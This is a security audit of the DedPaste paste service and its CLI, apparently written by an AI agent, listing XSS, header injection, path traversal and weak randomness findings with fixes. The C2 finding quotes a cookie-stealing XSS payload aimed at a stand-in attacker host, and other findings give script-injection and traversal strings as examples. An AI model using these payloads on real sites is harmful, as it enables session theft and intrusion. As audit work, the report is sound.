# DedPaste Security Audit Report

**Audit Date:** 2026-02-22
**Auditor:** Code Security Agent (Claude Opus 4.6)
**Scope:** Full codebase review -- Cloudflare Worker (`src/`), CLI (`cli/`), configuration, and dependencies
**Version Audited:** 1.23.2 (commit 6b46c42)

---

## Executive Summary

This audit identified **4 Critical**, **6 High**, **8 Medium**, and **6 Low** severity findings across the DedPaste codebase. The most urgent issues relate to insecure random number generation for paste IDs, missing security headers on the worker, unsanitized markdown rendering that enables stored XSS, and path traversal vulnerabilities in the key management system. The encryption implementation is generally sound (AES-256-GCM with RSA-OAEP, OpenPGP via openpgp.js), though the RSA key size of 2048 bits falls below modern recommendations.

---

## Critical Findings

### C1. Insecure Random Number Generation for Paste IDs

**Severity**: Critical
**Location**: `src/index.ts:83-91`
**Finding**: The `generateId()` function uses `Math.random()` to generate paste IDs, which is cryptographically insecure. `Math.random()` uses a PRNG that is not suitable for security-sensitive contexts. On Cloudflare Workers, the `crypto.getRandomValues()` API is available and should be used instead.
**Risk**: An attacker could predict paste IDs and access pastes (including one-time pastes) before the intended recipient. This is especially dangerous for encrypted and one-time pastes where the URL is the primary access control mechanism.
**Recommendation**: Replace `Math.random()` with `crypto.getRandomValues()`:
```typescript
function generateId(length = 8): string {
  const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  const randomValues = new Uint32Array(length);
  crypto.getRandomValues(randomValues);
  let result = "";
  for (let i = 0; i < length; i++) {
    result += chars.charAt(randomValues[i] % chars.length);
  }
  return result;
}
```
Also increase the default ID length from 8 to at least 16 characters to increase the entropy space.
**References**: CWE-330 (Use of Insufficiently Random Values), OWASP Cryptographic Failures

---

### C2. Stored XSS via Markdown Rendering

**Severity**: Critical
**Location**: `src/index.ts:1220-1227`, `src/index.ts:1794`
**Finding**: Markdown content uploaded by users is rendered to HTML using `marked.parse()` without any HTML sanitization. While the custom code block renderer uses `escapeHtml()`, the `marked` library itself does NOT sanitize inline HTML within markdown. A paste containing `<script>alert('XSS')</script>` or `<img onerror="fetch('https://evil.com?c='+document.cookie)">` embedded in markdown would execute in any visitor's browser.

The rendered HTML is inserted directly into the page:
```typescript
<div class="markdown-content">
  ${htmlContent}   // <-- unsanitized marked output
</div>
```

Additionally, the original markdown is embedded as a JSON string on line 1808:
```typescript
const originalMarkdown = ${JSON.stringify(markdownContent)};
```
While `JSON.stringify` escapes quotes and special characters, this pattern should still be reviewed carefully.

**Risk**: Any user can upload a markdown paste that executes arbitrary JavaScript in another user's browser. This enables session hijacking, credential theft, defacement, and phishing.
**Recommendation**:
1. Use a sanitization library like `dompurify` (via `isomorphic-dompurify` for Workers) or `sanitize-html` after `marked.parse()`.
2. Add a Content-Security-Policy header that blocks inline scripts (see H1 below).
3. Consider rendering markdown client-side instead of server-side to reduce the attack surface.
**References**: CWE-79 (Cross-site Scripting), OWASP A03:2021 Injection

---

### C3. No Authentication or Authorization on API Endpoints

**Severity**: Critical
**Location**: `src/index.ts:120-288` (entire request handler)
**Finding**: All API endpoints (upload, multipart upload, get, delete) are completely unauthenticated. Any anonymous user can:
- Upload unlimited content to R2 storage
- Initiate multipart uploads up to 5GB
- Access any paste by guessing/brute-forcing 8-character IDs
- Abuse the service for malware distribution, data exfiltration, or illegal content hosting

**Risk**: The service is open to abuse at massive scale. Storage costs could be driven up maliciously. The service could be used to host malicious content, with the domain operator bearing legal liability.
**Recommendation**:
1. Implement API key or token-based authentication at minimum for uploads.
2. Add rate limiting per IP/fingerprint (Cloudflare Workers supports `request.cf.clientTrustScore` and rate limiting rules).
3. Add upload size limits for non-multipart uploads (currently only multipart has a 5GB cap; regular uploads have no size limit).
4. Consider requiring CAPTCHA or proof-of-work for anonymous uploads.
**References**: CWE-306 (Missing Authentication for Critical Function), OWASP A07:2021 Identification and Authentication Failures

---

### C4. Hardcoded Mixpanel Analytics Token in Source Code

**Severity**: Critical
**Location**: `src/analytics.ts:27`, `src/analytics.ts:232`, `cli/analytics.ts:41`
**Finding**: The Mixpanel project token `9c4a09e9631e9675165a65a03c54dc6e` is hardcoded in multiple source files and shipped in the published npm package. While Mixpanel project tokens are considered "public" by Mixpanel's design (unlike API secrets), having a hardcoded token:
- Allows anyone to send fake analytics events to pollute the project data
- Exposes the analytics infrastructure to abuse
- The token is present in both the worker and CLI code, meaning it is distributed to every user who installs the npm package

**Risk**: Analytics data integrity is compromised. An attacker can inject false tracking events, manipulate metrics, or perform analytics denial-of-service.
**Recommendation**:
1. Move the token to environment variables/secrets (`wrangler secret put MIXPANEL_TOKEN`).
2. For the CLI, use `process.env.DEDPASTE_MIXPANEL_TOKEN` with an opt-in model.
3. Consider whether analytics is appropriate in a security-focused tool and make it opt-in with clear disclosure.
**References**: CWE-798 (Use of Hard-coded Credentials)

---

## High Findings

### H1. Missing Security Headers

**Severity**: High
**Location**: `src/index.ts` (all response handlers)
**Finding**: The worker does not set any security headers on responses:
- No `Content-Security-Policy` header (enables XSS, clickjacking, data injection)
- No `X-Content-Type-Options: nosniff` (enables MIME-type sniffing attacks)
- No `X-Frame-Options: DENY` (enables clickjacking)
- No `Strict-Transport-Security` header (allows HTTPS downgrade)
- No `Referrer-Policy` header (leaks paste URLs in referrer headers)
- No `Permissions-Policy` header

**Risk**: Multiple attack vectors remain open: XSS amplification, clickjacking of paste content, MIME confusion attacks, and information leakage via Referrer headers.
**Recommendation**: Add a middleware or wrapper that sets security headers on all responses:
```typescript
const securityHeaders = {
  "Content-Security-Policy": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src 'self' data:;",
  "X-Content-Type-Options": "nosniff",
  "X-Frame-Options": "DENY",
  "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
  "Referrer-Policy": "no-referrer",
  "Permissions-Policy": "camera=(), microphone=(), geolocation=()"
};
```
**References**: OWASP A05:2021 Security Misconfiguration

---

### H2. Overly Permissive CORS Policy

**Severity**: High
**Location**: `src/index.ts:153-158`, `src/index.ts:279`, `src/index.ts:676-679` (and 20+ more locations)
**Finding**: Every response includes `"Access-Control-Allow-Origin": "*"`, allowing any website to make cross-origin requests to the DedPaste API. This means any malicious website can:
- Upload pastes on behalf of visitors
- Read paste content cross-origin
- Enumerate paste IDs

**Risk**: Cross-origin attacks can leverage the DedPaste API for data exfiltration, CSRF-like attacks, and abuse.
**Recommendation**: Restrict CORS to the specific origins that need access (e.g., the DedPaste web UI domain). For the CLI, CORS is not needed. Consider a whitelist approach:
```typescript
const allowedOrigins = ["https://paste.d3d.dev"];
```
**References**: CWE-942 (Permissive Cross-domain Policy), OWASP A05:2021

---

### H3. Content-Disposition Header Injection

**Severity**: High
**Location**: `src/index.ts:955`, `src/index.ts:1044`
**Finding**: The filename from user-supplied metadata or URL path is inserted directly into the `Content-Disposition` header without proper sanitization:
```typescript
"Content-Disposition": `${disposition}; filename="${effectiveFilename}"`
```
Where `effectiveFilename` can come from `urlFilename` (extracted from URL path) or `filename` (from stored metadata, originally from `X-Filename` header). A specially crafted filename containing `"` characters could break out of the quoted value and inject additional header directives.

**Risk**: Header injection can lead to response splitting, cache poisoning, or misleading the user about the downloaded file type.
**Recommendation**: Sanitize filenames by removing or escaping special characters:
```typescript
const safeFilename = effectiveFilename.replace(/["\\\r\n]/g, '_');
```
Use RFC 6266 compliant encoding: `filename*=UTF-8''${encodeURIComponent(filename)}`
**References**: CWE-113 (HTTP Response Splitting)

---

### H4. Path Traversal in Key Storage Functions

**Severity**: High
**Location**: `cli/keyManager.ts:149`, `cli/keyManager.ts:320`, `cli/keyManager.ts:357`, `cli/keyManager.ts:402`
**Finding**: The `addFriendKey`, `addPgpKey`, `addKeybaseKey`, and `addGitHubKey` functions construct file paths using unsanitized user-provided names:
```typescript
const keyPath = path.join(FRIENDS_KEY_DIR, `${name}.pem`);
await fsPromises.writeFile(keyPath, keyContent);
```
If `name` contains path traversal characters (e.g., `../../.bashrc`, `../../../etc/cron.d/evil`), an attacker who can influence the key name could write files to arbitrary locations on the filesystem.

**Risk**: Arbitrary file write on the system running the CLI. Could lead to code execution via cron, shell profiles, or other auto-executed files.
**Recommendation**: Validate and sanitize the key name to only allow alphanumeric characters, hyphens, dots, and underscores:
```typescript
function sanitizeKeyName(name: string): string {
  return name.replace(/[^a-zA-Z0-9._@-]/g, '_');
}
```
Also verify the resolved path stays within the intended directory:
```typescript
const resolvedPath = path.resolve(keyPath);
if (!resolvedPath.startsWith(path.resolve(FRIENDS_KEY_DIR))) {
  throw new Error('Invalid key name: path traversal detected');
}
```
**References**: CWE-22 (Path Traversal)

---

### H5. No Upload Size Limit for Standard (Non-Multipart) Uploads

**Severity**: High
**Location**: `src/index.ts:586-681` (`handleUpload`), `src/index.ts:2099-2148` (`handleWebUpload`), `src/index.ts:2153-2203` (`handleTextUpload`)
**Finding**: While multipart uploads have a 5GB maximum (`LARGE_FILE_CONSTANTS.MAX_FILE_SIZE`), the standard upload handlers (`/upload`, `/temp`, `/api/upload`, `/api/text`) have no content size validation beyond checking for empty content. An attacker can upload arbitrarily large files in a single request.

**Risk**: Storage exhaustion, increased R2 costs, denial-of-service.
**Recommendation**: Add explicit size limits:
```typescript
const MAX_STANDARD_UPLOAD_SIZE = 25 * 1024 * 1024; // 25MB
if (content.byteLength > MAX_STANDARD_UPLOAD_SIZE) {
  return new Response("Content too large. Maximum size is 25MB for standard uploads.", { status: 413 });
}
```
**References**: CWE-770 (Allocation of Resources Without Limits)

---

### H6. RSA-2048 Key Size Below Modern Recommendations

**Severity**: High
**Location**: `cli/keyManager.ts:114`
**Finding**: The key generation function creates RSA-2048 keys:
```typescript
const { privateKey, publicKey } = crypto.generateKeyPairSync('rsa', {
  modulusLength: 2048,
  ...
});
```
NIST recommends RSA-3072 or higher for security beyond 2030. RSA-2048 provides approximately 112 bits of security, while RSA-3072 provides 128 bits.

**Risk**: Keys generated today with RSA-2048 may be vulnerable to advances in factoring algorithms or quantum computing sooner than expected.
**Recommendation**: Increase the default key size to 4096 bits, or better yet, offer Ed25519/Curve25519 key generation as the default (faster and more secure).
**References**: NIST SP 800-57 Part 1, CWE-326 (Inadequate Encryption Strength)

---

## Medium Findings

### M1. In-Memory Viewed Pastes Tracker is Not Distributed

**Severity**: Medium
**Location**: `src/index.ts:104` (`viewedPastes` global variable)
**Finding**: The one-time paste viewing tracker uses an in-memory JavaScript object that is local to a single Cloudflare Worker instance. In a distributed deployment (which Cloudflare Workers inherently is), different edge locations or isolates will have different copies of this tracker. While KV is used as a backup, KV has eventual consistency (not strong consistency), meaning there is a race window where a one-time paste can be viewed multiple times from different edge locations.

**Risk**: One-time pastes may be viewable more than once, defeating their security guarantee.
**Recommendation**:
1. Use Cloudflare Durable Objects for strongly consistent one-time paste tracking.
2. Alternatively, use KV with a "check-and-delete" atomic operation pattern where the paste is deleted from R2 first and the content served from the response buffer.
**References**: CWE-367 (Time-of-check Time-of-use Race Condition)

---

### M2. No Rate Limiting on Any Endpoint

**Severity**: Medium
**Location**: `src/index.ts` (entire worker)
**Finding**: There is a `RateLimitError` class defined in `src/types/index.ts:207-210`, but it is never used anywhere in the codebase. No rate limiting is implemented on any endpoint. This means:
- Unlimited paste creation rate
- Unlimited paste retrieval (enables brute-force ID enumeration)
- Unlimited multipart upload session creation

**Risk**: Denial-of-service, storage cost abuse, brute-force attacks on paste IDs.
**Recommendation**: Implement rate limiting using Cloudflare's built-in rate limiting features or a KV-based token bucket algorithm.
**References**: CWE-799 (Improper Control of Interaction Frequency), OWASP A04:2021

---

### M3. Private Keys Stored Without Encryption at Rest

**Severity**: Medium
**Location**: `cli/keyManager.ts:127-128`
**Finding**: RSA private keys are written to disk in plaintext PEM format:
```typescript
await fsPromises.writeFile(privateKeyPath, privateKey);
```
No passphrase protection or file encryption is applied. The key database (`keydb.json`) is also stored in plaintext.

**Risk**: If the user's filesystem is compromised (malware, stolen device, shared hosting), all private keys are immediately exposed.
**Recommendation**:
1. Encrypt private keys at rest using a user-provided passphrase (PKCS#8 encrypted PEM format).
2. Set restrictive file permissions (0600) on private key files.
3. Consider using OS keychain integration (macOS Keychain, Linux secret-service, Windows Credential Manager).
**References**: CWE-312 (Cleartext Storage of Sensitive Information)

---

### M4. `keybase-api` Package is Version 0.0.1 (Abandoned/Unmaintained)

**Severity**: Medium
**Location**: `package.json:72`
**Finding**: The `keybase-api` package is at version `0.0.1`, indicating it is either extremely early-stage or abandoned. Keybase itself was acquired by Zoom in 2020 and its active development has largely ceased. Using an unmaintained dependency at version 0.0.1 poses supply chain risks.

**Risk**: The dependency could contain unpatched vulnerabilities, could be taken over via npm name squatting, or could stop functioning without notice.
**Recommendation**:
1. Evaluate if the Keybase integration is still needed given Keybase's declining usage.
2. If needed, vendor the minimal required code or use the Keybase API directly via `fetch`.
3. At minimum, pin the exact version in `package-lock.json` and audit the package source.
**References**: CWE-1104 (Use of Unmaintained Third-Party Components)

---

### M5. Fallback Key ID Generation Uses `Math.random()`

**Severity**: Medium
**Location**: `cli/pgpUtils.ts:399`
**Finding**: When PGP key ID extraction fails, a fallback ID is generated using `Math.random()`:
```typescript
keyId = Math.random().toString(16).substring(2, 10).toUpperCase();
```
This creates non-unique, predictable key identifiers that could collide with real key IDs.

**Risk**: Key ID collisions could lead to the wrong encryption key being used, or key confusion attacks.
**Recommendation**: Use `crypto.randomBytes(8).toString('hex').toUpperCase()` for cryptographically random fallback IDs, or throw an error instead of generating fake IDs.
**References**: CWE-330 (Use of Insufficiently Random Values)

---

### M6. Potential JSON Injection via `marked` Configuration

**Severity**: Medium
**Location**: `src/index.ts:1808`
**Finding**: The original markdown content is embedded in the rendered HTML page as a JavaScript variable:
```typescript
const originalMarkdown = ${JSON.stringify(markdownContent)};
```
While `JSON.stringify` provides escaping, certain edge cases with `</script>` strings inside the markdown content could break out of the script context. For example, if the markdown contains the literal string `</script><script>alert(1)</script>`, `JSON.stringify` would produce `"</script><script>alert(1)</script>"`, and the browser's HTML parser would see the first `</script>` as closing the script tag.

**Risk**: XSS via script tag injection in markdown content.
**Recommendation**: Replace `</` with `<\/` in the JSON output:
```typescript
const originalMarkdown = ${JSON.stringify(markdownContent).replace(/</g, '\\u003c')};
```
**References**: CWE-79 (Cross-site Scripting)

---

### M7. Test Mode Bypass in PGP Decryption

**Severity**: Medium
**Location**: `cli/encryptionUtils.ts:343`, `cli/pgpUtils.ts:792-794`
**Finding**: A `TEST_MODE` passphrase bypass exists in the PGP decryption code:
```typescript
if (passphrase === 'TEST_MODE') {
  console.log('TEST MODE: Skipping actual PGP decryption');
  return Buffer.from('TEST MODE DECRYPTION - This would normally show decrypted content');
}
```
This test code should not be in production builds.

**Risk**: If an attacker can influence the passphrase parameter, they can bypass decryption entirely (though they would not get the actual plaintext).
**Recommendation**: Remove test mode from production code entirely, or gate it behind an environment variable (`NODE_ENV === 'test'`).
**References**: CWE-489 (Active Debug Code)

---

### M8. KV Namespace IDs Exposed in `wrangler.toml`

**Severity**: Medium
**Location**: `wrangler.toml:20-28`
**Finding**: The KV namespace IDs are committed to the repository:
```toml
id = "0d25f4b9e61a44ab92634e7941cea0a0"
preview_id = "0d25f4b9e61a44ab92634e7941cea0a0"
...
id = "c0251d912bb045df9c363b1b00be81a1"
```
While these IDs alone don't grant access (they require Cloudflare account authentication), they unnecessarily expose infrastructure details.

**Risk**: Information disclosure that aids targeted attacks against the Cloudflare account.
**Recommendation**: Use environment-specific `wrangler.toml` files or environment variables for namespace IDs. Reference them via `wrangler.toml` variable substitution if supported, or use `.dev.vars`.
**References**: CWE-200 (Exposure of Sensitive Information)

---

## Low Findings

### L1. `console.log` and `console.error` Statements May Leak Sensitive Data

**Severity**: Low
**Location**: Multiple locations across `src/index.ts`, `cli/pgpUtils.ts`, `cli/encryptionUtils.ts`
**Finding**: Extensive console logging includes paste IDs, storage keys, content types, encryption status, and operation details. In the worker context, these logs are visible in Cloudflare's logging dashboard.

Example: `src/index.ts:628`: `console.log(\`Created one-time paste with storage key ${storageKey}, isEncrypted=${isEncrypted}\`);`

**Risk**: Log aggregation systems could expose paste metadata to operators or through log exfiltration.
**Recommendation**: Use structured logging with log levels, and ensure sensitive identifiers are not logged in production. Reduce verbose logging behind a debug flag.
**References**: CWE-532 (Insertion of Sensitive Information into Log File)

---

### L2. Missing `noopener noreferrer` on External Links

**Severity**: Low
**Location**: `src/index.ts:313`, and throughout `src/muiStyles.ts`
**Finding**: External links in the generated HTML pages use `target="_blank"` without `rel="noopener noreferrer"`:
```html
<a href="https://github.com/anoncam/dedpaste" target="_blank" class="btn-secondary">
```
**Risk**: The linked page could access `window.opener` and potentially redirect the DedPaste tab (reverse tabnabbing).
**Recommendation**: Add `rel="noopener noreferrer"` to all `target="_blank"` links.
**References**: CWE-1022 (Use of Web Link to Untrusted Target with window.opener Access)

---

### L3. Dependencies Include Dev-Only Tools in `dependencies` (Not `devDependencies`)

**Severity**: Low
**Location**: `package.json:61-79`
**Finding**: Several packages that appear to be development-only tools are listed under `dependencies` rather than `devDependencies`:
- `eslint` (v9.34.0) -- linter, not needed at runtime
- `prettier` (v3.6.2) -- formatter, not needed at runtime
- `@types/highlight.js`, `@types/marked` -- TypeScript type definitions, not needed at runtime
- `@emotion/react`, `@emotion/styled`, `@emotion/server`, `@mui/material` -- UI framework packages that are bundled into the worker at build time and should not be runtime npm dependencies

**Risk**: Increased attack surface from unnecessary runtime dependencies. Users who install `dedpaste` globally will download and install all these packages unnecessarily.
**Recommendation**: Move dev-only packages to `devDependencies`. For packages bundled into the worker, they should also be in `devDependencies`.
**References**: CWE-1104 (Use of Unmaintained Third-Party Components)

---

### L4. `engines` Field Specifies Node.js >= 14

**Severity**: Low
**Location**: `package.json:46`
**Finding**: The `engines` field allows Node.js 14, which has been end-of-life since April 2023. Running on EOL Node.js versions means missing security patches.

**Risk**: Users on outdated Node.js could be exposed to known Node.js vulnerabilities.
**Recommendation**: Update to `"node": ">=18"` at minimum (Node.js 18 is in maintenance LTS until April 2025; Node.js 20 is the current active LTS).
**References**: CWE-1104 (Use of Unmaintained Third-Party Components)

---

### L5. `postinstall` Script Runs `chmod` Without Error Handling

**Severity**: Low
**Location**: `package.json:14`
**Finding**: The `postinstall` script runs `chmod +x ./cli/index.js`. This will fail silently on Windows systems and has no error handling.

**Risk**: Minor -- no security impact, but could mask installation issues.
**Recommendation**: Add platform detection or use a cross-platform alternative.
**References**: Informational

---

### L6. Compatibility Date in `wrangler.toml` is Outdated

**Severity**: Low
**Location**: `wrangler.toml:3`
**Finding**: `compatibility_date = "2023-10-02"` is over 2 years old. Cloudflare Workers compatibility dates control which runtime behaviors are active. Older dates may miss security improvements and bug fixes in the Workers runtime.

**Risk**: Missing runtime-level security improvements from Cloudflare.
**Recommendation**: Update to a recent compatibility date (e.g., `2025-01-01` or later).
**References**: Informational

---

## Dependency Audit Results

**Note:** The Sonatype MCP tools were rate-limited during this audit and could not return results. The following assessment is based on manual review of declared versions.

| Package | Version | Risk Assessment |
|---------|---------|----------------|
| `openpgp` | ^6.2.2 | **Low Risk** -- Active, well-maintained crypto library. Current latest is 6.x. Ensure using latest 6.x patch. |
| `marked` | ^16.2.0 | **Medium Risk** -- Markdown renderer. Historically has had XSS vulnerabilities. The `sanitize` option was removed in v2+. Must use external sanitization. |
| `node-fetch` | ^3.3.2 | **Low Risk** -- Stable, maintained. Node 18+ has built-in `fetch`. Consider migrating to native fetch. |
| `keybase-api` | ^0.0.1 | **High Risk** -- Version 0.0.1 suggests abandoned/prototype. Keybase service is essentially deprecated. |
| `mixpanel` | ^0.18.1 | **Low Risk** -- Official Mixpanel SDK. Evaluate need for analytics in a privacy-focused tool. |
| `commander` | ^13.1.0 | **Low Risk** -- Widely used, actively maintained CLI framework. |
| `inquirer` | ^12.9.4 | **Low Risk** -- Actively maintained interactive prompt library. |
| `highlight.js` | ^11.11.1 | **Low Risk** -- Actively maintained syntax highlighter. |
| `uuid` | ^13.0.0 | **Low Risk** -- Simple UUID generation. |
| `clipboardy` | ^4.0.0 | **Low Risk** -- Clipboard utility. |
| `mime-types` | ^2.1.35 | **Low Risk** -- MIME type lookup. Stable. |
| `eslint` | ^9.34.0 | **N/A** -- Should be devDependency only. |
| `prettier` | ^3.6.2 | **N/A** -- Should be devDependency only. |
| `@emotion/*`, `@mui/material` | Various | **Low Risk** -- Should be devDependencies (bundled at build). |
| `wrangler` | ^4.60.0 | **Low Risk** -- Official Cloudflare tooling, dev only. |

**Recommendation:** Run `npm audit` regularly and integrate it into CI/CD. Consider using `npm audit --production` to focus on runtime dependencies.

---

## Remediation Priority

| Priority | Finding | Effort |
|----------|---------|--------|
| 1 (Immediate) | C1 - Insecure PRNG for paste IDs | Low |
| 2 (Immediate) | C2 - Stored XSS via markdown | Medium |
| 3 (This Sprint) | H1 - Missing security headers | Low |
| 4 (This Sprint) | H2 - Overly permissive CORS | Low |
| 5 (This Sprint) | H5 - No upload size limit | Low |
| 6 (This Sprint) | H3 - Content-Disposition injection | Low |
| 7 (Next Sprint) | C3 - No authentication | High |
| 8 (Next Sprint) | H4 - Path traversal in key storage | Low |
| 9 (Next Sprint) | H6 - RSA-2048 key size | Medium |
| 10 (Next Sprint) | C4 - Hardcoded Mixpanel token | Low |
| 11 (Backlog) | M1-M8 - Medium findings | Various |
| 12 (Backlog) | L1-L6 - Low findings | Various |

---

## Positive Security Observations

1. **Encryption design is sound**: The hybrid RSA+AES-256-GCM scheme with random symmetric keys and random IVs is correctly implemented. No IV/nonce reuse was detected.
2. **escapeHtml function**: HTML escaping is properly implemented for user-controlled strings in non-markdown contexts.
3. **Temp file permissions**: PGP temp files are created with mode `0o600` (owner-only read/write).
4. **Resume state permissions**: Resume state directory uses mode `0o700`, files use `0o600`.
5. **No `eval()` or `Function()` usage**: No dynamic code execution was found.
6. **No prototype pollution vectors**: No direct `__proto__` or `constructor` manipulation detected.
7. **OpenPGP.js v6**: Using a current, actively maintained version of the PGP library.
8. **Proper OAEP padding**: RSA encryption correctly uses `RSA_PKCS1_OAEP_PADDING` rather than insecure PKCS1v1.5 padding.
9. **Error messages are generally safe**: Most error responses return generic messages rather than stack traces.

---

*End of Security Audit Report*
